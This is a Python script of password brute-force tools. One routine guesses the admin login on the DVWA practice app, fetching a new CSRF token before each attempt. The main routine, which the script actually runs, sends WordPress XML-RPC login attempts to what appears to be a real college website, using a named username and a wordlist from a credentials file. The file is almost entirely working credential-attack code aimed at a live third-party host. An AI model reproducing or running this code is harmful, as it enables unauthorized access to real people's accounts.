from requests import get,post
from colorama import Fore
from bs4 import BeautifulSoup

def extract_hidden_input (url,cookie):
    res = get(url,cookies=cookie)
    print(pretify_html(res.content))
    print("#"*100)
    soup = BeautifulSoup(res.content,'html.parser')
    hidden_inp = soup.find(name="input",attrs={"type" : "hidden"})
    return hidden_inp.attrs


def pretify_html (html):
    soup = BeautifulSoup(html,'html.parser')
    return soup.prettify()



def makeGetReq(url,payload,session_cookie,headers={},error_msg=None,success_msg=None):
    """Helps to make Get Request with params cookies and headers"""
    try:
        res = get(url,payload,cookies=session_cookie)
        if (error_msg != None) and  (error_msg not in res.content.decode()):
            print(Fore.GREEN + "[+] Possible credentials are : {}".format(payload))

            
        if (success_msg != None) and   success_msg  in res.content.decode():
            print(Fore.GREEN + "[+] Possible credentials are : {}".format(payload))


    except KeyboardInterrupt:
        print("Going to die...")
        exit(0)


    except Exception as e:
        print("[!] Failed to make request with params: {}\n Error: {}".format(payload,e))


def makePostReq(url,payload,session_cookie,headers={'Accept':"*/*"},error_msg=None,success_msg=None):
    """Helps to make POST Request with params cookies and headers"""
    try:

        print(Fore.GREEN + "[+] Possible credentials are : {}".format(headers))
        res = post(url,data=payload,cookies=session_cookie, headers= headers)
        if (error_msg != None) and  (error_msg not in res.content.decode()):
            print(pretify_html(res.content))
            print(Fore.GREEN + "[+] Possible credentials are : {}".format(payload))

            
        if (success_msg != None) and   success_msg  in res.content.decode():
            print(Fore.GREEN + "[+] Possible credentials are : {}".format(payload))


    except KeyboardInterrupt:
        print("Going to die...")
        exit(0)


    except Exception as e:
        print("[!] Failed to make request with params: {}\n Error: {}".format(payload,e))


def xml_rpc_attack():
    url = "https://www.jbcollege.in/xmlrpc.php"
    headersList = {"Accept": "*/*", "Content-Type": "application/xml" }
    cookie = {"humans_21909":"1"}
    fh = open("/home/hacker/Downloads/Telegram Desktop/txtfiles/credentials/updated_passwords.txt","rb")
    
    for i in range(500):
        line = str(fh.readline().decode()).strip() 
        username = "pawan"
        payload = """
            <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
            <param><value>{}</value></param>
            <param><value>{}</value></param>
            </params>
            </methodCall>
        """.format(username,line)

        # print( Fore.RESET + "[*] Trying ({})".format(payload))
        makePostReq(url=url,payload=payload,session_cookie=cookie,headers=headersList,error_msg="Incorrect username or password.")
        break

    fh.close()


def brute_attack():
    url = "http://dvwa/vulnerabilities/brute/"

    cookie = {"PHPSESSID":"fl2d6a5gjfgba52mk55c440ns1","security":"impossible"}
    extract_hidden_input(url,cookie)
    fh = open("/usr/share/wordlists/rockyou.txt","rb")

    for i in range(500):
        line = str(fh.readline().decode()).strip() 

        # For CSRF bypass
        hidden_inp = extract_hidden_input(url,cookie) 
        payload = {"username":"admin","password":line,"Login":"Login","user_token": hidden_inp['value']}

        print( Fore.RESET + "[*] Trying ({})".format(payload))
        makePostReq(url=url,payload=payload,session_cookie=cookie,error_msg="Username and/or password incorrect.")
        break

    fh.close()


xml_rpc_attack()


# # http://dvwa/vulnerabilities/brute/?username=ad&password=ad&Login=Login&user_token=8bda3c3516204d51f8e7059b653004f5#
# cookie = {"PHPSESSID":"fl2d6a5gjfgba52mk55c440ns1","security":"low"}
# cookie = {"PHPSESSID":"fl2d6a5gjfgba52mk55c440ns1","security":"medium"}
# cookie = {"PHPSESSID":"fl2d6a5gjfgba52mk55c440ns1","security":"high"}
# cookie = {"PHPSESSID":"fl2d6a5gjfgba52mk55c440ns1","security":"impossible"} (Unresolved)

# For low security
# payload = {"username":"admin","password":line,"Login":"Login"}

# makeGetReq(url=url,payload=payload,session_cookie=cookie,error_msg="Username and/or password incorrect.")
